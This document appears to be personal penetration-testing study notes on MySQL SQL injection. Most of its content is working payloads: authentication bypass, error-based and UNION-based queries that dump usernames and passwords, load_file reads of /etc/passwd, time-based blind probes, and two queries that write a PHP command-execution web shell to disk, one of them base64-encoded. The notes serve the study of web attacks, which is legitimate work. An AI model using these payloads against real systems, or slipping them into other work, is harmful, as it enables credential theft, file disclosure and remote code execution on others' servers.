**Key Concept:** We start with a baseline of expected output, then attempt to error the database or extract information based on deviations from this expected output. These deviations can include anything from an on-screen error, to entirely different HTTP response codes.

**Note:** We can try adding semicolons before comments in case commands are not working

## Methodology

### Identification

Once we realize SQLi is possible by erroring the site, the **first thing** we need to do is figure out how to do is **inject data in the query without breaking it.**

**Example entrypoints:**

```
 [Nothing]
'
"
`
')
")
`)
'))
"))
`))

'"`)(
```

**Note:** For long pages, simply scroll to the bottom of burp and monitor when the number of lines changes in the page.

We can now confirm existence with numerical/string comparison:

```mysql
# Confirm with numerical comparison
'' OR 1=1 -- //

# Confirm with string comparison
'' OR '1'='1' -- //
```

### Error-based Payloads vs Authentication Queries

We can first attempt to dump information in an error response. This is particularly useful against authentication against authenticaton queries as a valid/invalid response will not display table information.

```mysql
# We can first attempt to view version information inside the error response
'' OR 1=1 in (SELECT @@version) -- //

# We can now attempt to dump table information
'' OR 1=1 in (SELECT * FROM users) -- //

# In the case where we can only query one column at a time
'' OR 1=1 in (SELECT password FROM users) -- //

# We can now specify a user to dump the password for
'' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

### UNION-based payloads vs Search Queries

We can use `ORDER BY` and `UNION SELECT` in a search field to visualize and enumerate a database with many columns.

```mysql
# We first use ORDER BY and increment until we receive an error
'' ORDER BY 1 -- //
'' ORDER BY 1,2 -- //
'' ORDER BY 1,2,3 -- //
'' ORDER BY 1,2,3,4 -- //
'' ORDER BY 1,2,3,4,5 -- //
'' ORDER BY 1,2,3,4,5,6 -- //
# We now get the error "Unknown column '6' in 'order clause'" so we know the database has 6 columns

# We can now check to see which values are being returned by providing each column with an identifier that we can quickly index and check for in the response
'' UNION SELECT 'Col1', 'Col2', 'Col3', 'Col4', 'Col5', 'Col6' -- //
'' UNION SELECT CONCAT('Col', 1), CONCAT('Col', 2), CONCAT('Col', 3), CONCAT('Col', 4), CONCAT('Col', 5), CONCAT('Col', 6) -- //

# We can now rearange our statement to first query baseline information
'' UNION SELECT null, database(), user(), @@version, null -- //

# Now we can query all databases available for us to enumerate (note: information_schema is default)
'' UNION SELECT null, schema_name, null, null, null FROM information_schema.schemata -- //

# We can now query tables for our desired databases
'' UNION SELECT null, table_name, null, null, null FROM information_schema.tables WHERE table_schema=database() -- //
'' UNION SELECT null, table_name, null, null, null FROM information_schema.tables WHERE table_schema='another_db' -- //

# We can now query columns for our desired table
'' UNION SELECT null, column_name, null, null, null FROM information_schema.columns WHERE table_schema=database() -- //

# We now have all the information we need to query table data
'' UNION SELECT null, username, password, description, null FROM users -- //
'' UNION SELECT null, username, password, description, null FROM users WHERE username='admin' -- //

# LFI (also works in error payload)
'' UNION SELECT null, load_file('/etc/passwd'), null, null, null -- //
'' UNION SELECT null, load_file('../../../../../../etc/passwd'), null, null, null -- //

# RCE (doesn't matter if PHP code is in viewable column)
'' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/shell.php" -- //
```

**Note:** We can also add a `%` before the single quote to bypass input validation

### Blind SQL Injections

Used in the case where database responses are never returned and behavior is inferred using either boolean or time-based logic.

```mysql
# Time based identification (value before ' must be exist for sleep to succeed, allowing us to identify existing values)
'' AND IF (1=1, sleep(2),'false') -- //
```

## Additional Concepts

UNION-based attacks can be successful against an individual product page when performed using primary keys/ID's that don't exist as querying an undefined row will simply union the provided columns and return the values provided in the request (as they were originally undefined).

In the following UNION-based example, the product of ID 999 does not exist, leading to the union attack exposing the vesion within the output (as the corresponding unioned row)

```mysql
'999' UNION SELECT 1,@@version,3,4,5,6,7,8 -- //
```

### SQLI2RCE

Figure out what directory you have write permissions to (MySQL is /var/lib/mysql)

```mysql
''; select from_base64("PD9waHAKc3lzdGVtKCRfR0VUWydjbWQnXSk7Cj8+Cg==") into dumpfile '/var/lib/mysql/shell.php' -- //
```

Requires a method of executing the file (LFI, CSRF, etc.)
